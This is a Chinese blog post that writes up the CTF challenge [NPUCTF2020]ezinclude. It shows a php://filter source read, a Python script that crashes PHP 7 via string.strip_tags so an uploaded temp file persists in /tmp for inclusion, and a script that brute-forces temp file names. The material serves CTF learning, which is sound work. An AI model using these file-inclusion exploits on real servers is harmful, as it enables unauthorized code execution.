---

title: 日常练习41——php临时文件包含

date: 2021-08-24 19:14:58

tags: 练习

categories: test91

---

# [NPUCTF2020]ezinclude  

这道题有一个新的关于文件包含的知识点，所以记录一下。  

打开题目发现密码和用户名错误，f12可以看到提示。  

[![](https://pic.imgdb.cn/item/6124d57844eaada739921561.png)](https://pic.imgdb.cn/item/6124d57844eaada739921561.png)   

说是让md5加密后的用户名要等于密码才行，那么接下来就抓包看看更多信息。  

经过测试可以发现我们输入不同的name值后，在响应包中的Hash值会变，说明它将name编码后赋给了hash值，应该是md5哈希长度拓展攻击，我们直接把响应包里的hash值拿来就可以了。  

[![](https://pic.imgdb.cn/item/6124d6b344eaada73994dae9.png)](https://pic.imgdb.cn/item/6124d6b344eaada73994dae9.png)  

可以看到给出了下一个页面。  

[![](https://pic.imgdb.cn/item/6124d77244eaada73996e2ee.png)](https://pic.imgdb.cn/item/6124d77244eaada73996e2ee.png)  

但是这个页面直接打开是不行的，需要抓包拦截一下：  

[![](https://pic.imgdb.cn/item/6124d81344eaada739986c80.png)](https://pic.imgdb.cn/item/6124d81344eaada739986c80.png)  

可以看到是一个文件包含题目，但是这道题和之前做过的文件包含还是不同的，需要用到新的知识点。  

我们读取一下源码：  

	/flflflflag.php?file=php://filter/convert.base64-encode/resource=flflflflag.php  

得到源码如下：  

	<html>
	<head>
	<script language="javascript" type="text/javascript">
	           window.location.href="404.html";
	</script>
	<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
	</head>
	<>
	<body>
	<?php
	$file=$_GET['file'];
	if(preg_match('/data|input|zip/is',$file)){
		die('nonono');
	}
	@include($file);
	echo 'include($_GET["file"])';
	?>
	</body>
	</html>  

可以看到它过滤了伪协议并且没有给我们说明flag文件，很明显是不想让我们用php伪协议来做。  

我们用dirsearch可以扫描到一个dir.php页面。这个页面可以看到/tmp下所有文件。  

[![](https://pic.imgdb.cn/item/6124d94f44eaada7399bdc30.png)](https://pic.imgdb.cn/item/6124d94f44eaada7399bdc30.png)  

这里就要用到这个新知识点了——php临时包含文件。

这是php7.0的一个bug，可以在php7版本适用，具体原理比较简单：  

	使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell  

这个就是临时文件包含的原理，这道题目的页面明显是无法打开的，我们就从phpinfo页面下手，而它直接给出了/tmp页面，所以说我们也不必爆破生成的临时文件名，直接上传临时文件就可以了。  

这里上传文件要用脚本：  

	import requests
	from io import BytesIO
	 
	payload = "<?php phpinfo()?>"
	file_data = {
	    'file': BytesIO(payload.encode())
	}
	url = "http://7c1ec491-0b58-4130-ac74-4f967eed6c85.node4.buuoj.cn:81/flflflflag.php?"\
	      +"file=php://filter/string.strip_tags/resource=/etc/passwd"
	r = requests.post(url=url, files=file_data, allow_redirects=False)
  

[![](https://pic.imgdb.cn/item/6124f42c44eaada739da1015.png)](https://pic.imgdb.cn/item/6124f42c44eaada739da1015.png)  

上传完后再次查看dir.php就可以看到我们的临时文件了，然后访问这个文件即可。注意直接访问是看不到的，所以我们需要用../来逐层访问.   

在phpinfo页面得到flag。  

[![](https://pic.imgdb.cn/item/6124f4c344eaada739db726e.png)](https://pic.imgdb.cn/item/6124f4c344eaada739db726e.png)  

# 小结  

这道题目考察了一个新的php文件包含的知识点，关于临时文件上传的bug，这个bug的适用范围在php7.0，php5是没法利用的，而这道题也省略了爆破临时文件名这一环节，减少了脚本编写，算是简化了题目难度。下面也会附上爆破文件名的脚本和相关讲解。算是一个新的积累。  

[php文件包含之临时文件上传](https://www.cnblogs.com/tr1ple/p/11301743.html)  


## 文件名爆破脚本

	#!/usr/bin/env python
	# -*- coding: utf-8 -*-
	
	import requests
	import string
	
	charset = string.digits + string.letters
	
	host = "10.99.99.16"
	port = 80
	base_url = "http://%s:%d" % (host, port)
	
	
	def brute_force_tmp_files():
	    for i in charset:
	        for j in charset:
	            for k in charset:
	                for l in charset:
	                    for m in charset:
	                        for n in charset:
	                            filename = i + j + k + l + m + n
	                            url = "%s/index.php?function=extract&file=/tmp/php%s" % (base_url, filename) #url根据实际情况改下参数就行
	                            print url
	                            try:
	                                response = requests.get(url)
	                                if 'wwwwwwwwwwwwww' in response.content: #可以利用burp 多线程上传文件  
	                                    print "[+] Include success!"
	                                    return True
	                            except Exception as e:
	                                print e
	    return False
	
	
	def main():
	    brute_force_tmp_files()
	
	
	if __name__ == "__main__":
	    main()
